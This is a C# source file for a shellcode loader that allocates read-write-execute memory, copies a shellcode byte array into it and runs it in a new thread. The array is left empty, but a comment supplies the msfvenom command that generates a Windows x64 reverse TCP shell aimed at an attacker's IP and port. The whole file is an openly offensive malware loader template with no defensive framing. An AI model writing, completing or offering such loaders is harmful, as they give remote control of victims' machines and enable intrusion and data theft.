using System;
using System.Runtime.InteropServices;

namespace ShellcodeLoader
{
    class Program
    {
        static void Main(string[] args)
        {
            //Insert shellcode here.
            //msfvenom - p windows / x64 / shell_reverse_tcp LHOST = attackerIP LPORT = attackerPort - f csharp
            byte[] shellcode = new byte[] { };

            //Set up VirtualAlloc.
            IntPtr funcAddr;

            funcAddr = Methods.VirtualAlloc(
                IntPtr.Zero,
                (ulong)shellcode.Length,
                (uint)Methods.StateEnum.MEM_COMMIT,
                (uint)Methods.Protection.PAGE_EXECUTE_READWRITE);

            //Copy shellcode into memory.
            Marshal.Copy(shellcode, 0, funcAddr, shellcode.Length);

            //Set up variables that will be used before executing the code.
            IntPtr hThread = IntPtr.Zero;
            uint threadId = 0;
            IntPtr pinfo = IntPtr.Zero;

            //Execute the code.
            hThread = Methods.CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            Methods.WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;

        }
    }
    class Methods
    {
        //VirtualAlloc API to allocate memory.
        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAlloc(
            IntPtr lpStartAddr,
            ulong size,
            uint flallocationType,
            uint flProject);

        //CreateThread API to execute our shellcode.
        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(
            uint lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr param,
            uint dwCreationFlags,
            ref uint lpThreadId);

        [DllImport("kernel32.dll")]
        public static extern uint WaitForSingleObject(
            IntPtr hHandle,
            uint dwMilliseconds);

        public enum StateEnum
        {
            MEM_COMMIT = 0x1000,
            MEM_RESERVE = 0x2000,
            MEM_FREE = 0x10000,
        }

        public enum Protection
        {
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
        }
    }
}
